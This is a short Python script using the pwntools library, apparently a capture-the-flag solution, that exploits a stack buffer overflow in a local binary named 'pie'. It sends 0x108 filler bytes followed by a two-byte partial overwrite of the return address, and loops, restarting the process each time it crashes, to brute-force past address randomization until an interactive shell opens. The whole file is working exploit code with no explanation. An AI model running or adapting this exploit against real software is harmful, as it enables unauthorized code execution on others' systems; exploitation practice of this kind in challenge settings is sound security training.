from pwn import *
# context.log_level = 'debug'
payload = b'a'*(0x100+8)
payload += b'\xA3\x11'

while True:
    p = process('./pie')
    try:
        p.recvuntil("message")
        p.send(payload)
        p.interactive()
    except EOFError:
        p.close()
        continue
    except Exception as e:
        p.close()
        print(f"Unexpected error: {e}")
        continue
